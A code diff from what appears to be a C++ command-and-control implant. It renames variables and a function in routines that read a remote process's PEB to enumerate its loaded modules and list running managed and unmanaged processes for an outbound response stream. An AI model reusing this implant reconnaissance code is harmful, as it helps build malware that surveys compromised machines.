@@ -95,8 +95,8 @@ namespace Commands {
         CHAR ModNameA[MAX_PATH] 		= { };
         WCHAR ModNameW[MAX_PATH] 	    = { };
 
-        INT counter = 0;
-        SIZE_T size = 0;
+        INT Counter = 0;
+        SIZE_T Size = 0;
 
         Stream::PackDword(Outbound, CommandMods);
 
@@ -109,7 +109,7 @@ namespace Commands {
         if (NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(Process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr)) ) {
 
             if (
-                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, &pbi.PebBaseAddress->Ldr, &LdrData, sizeof(PPEB_LDR_DATA), &size)) ||
+                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, &pbi.PebBaseAddress->Ldr, &LdrData, sizeof(PPEB_LDR_DATA), &Size)) ||
                 !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, &LdrData->InMemoryOrderModuleList.Flink, &Entry, sizeof(PLIST_ENTRY), nullptr))) {
                 return_defer(ntstatus);
             }
@@ -118,17 +118,17 @@ namespace Commands {
             while (Entry != Head) {
                 if (
                     !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, CONTAINING_RECORD(Entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &cMod, sizeof(LDR_DATA_TABLE_ENTRY), nullptr)) ||
-                    !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, cMod.FullDllName.Buffer, &ModNameW, cMod.FullDllName.Length, &size)) ||
-                    size != cMod.FullDllName.Length) {
+                    !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, cMod.FullDllName.Buffer, &ModNameW, cMod.FullDllName.Length, &Size)) ||
+                    Size != cMod.FullDllName.Length) {
                     return_defer(ntstatus);
                 }
 
                 if (cMod.FullDllName.Length > 0) {
-                    size = x_wcstombs(ModNameA, ModNameW, cMod.FullDllName.Length);
+                    Size = x_wcstombs(ModNameA, ModNameW, cMod.FullDllName.Length);
 
                     Stream::PackString(Outbound, ModNameA);
                     Stream::PackDword64(Outbound, R_CAST(UINT64, cMod.DllBase));
-                    counter++;
+                    Counter++;
                 }
 
                 x_memset(ModNameW, 0, MAX_PATH);
@@ -142,7 +142,7 @@ namespace Commands {
         defer:
     }
 
-    VOID EnumProcesses(PPARSER Parser) {
+    VOID ProcessList(PPARSER Parser) {
 
         PSTREAM Stream          = Stream::CreateStreamWithHeaders(TypeResponse);
         PROCESSENTRY32 Entries  = { };
@@ -153,7 +153,7 @@ namespace Commands {
         ICLRMetaHost *pMetaHost     = { };
         ICLRRuntimeInfo *pRuntime   = { };
 
-        DWORD Type  = Parser::UnpackDword(Parser);
+        DWORD Type  = Parser::UnpackDword(Parser); // listing managed/un-managed processes
         DWORD Size  = 0;
         WCHAR Buffer[1024];
         BOOL Loaded = FALSE;
